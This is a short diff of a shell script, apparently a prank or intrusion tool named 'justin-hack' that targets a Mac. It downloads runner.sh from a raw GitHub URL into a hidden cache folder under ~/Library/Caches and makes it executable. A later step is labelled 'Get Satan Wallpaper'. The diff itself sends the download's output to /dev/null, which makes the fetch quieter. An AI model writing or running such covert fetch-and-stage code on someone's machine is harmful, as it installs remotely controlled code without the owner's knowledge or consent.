@@ -5,7 +5,7 @@ jh=~/Library/Caches/jh
 baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master
 
 # Update Runner
-curl -o $jh/runner.sh $baseurl/runner.sh
+curl -o $jh/runner.sh $baseurl/runner.sh > /dev/null
 chmod +x $jh/runner.sh
 
 # Get Satan Wallpaper
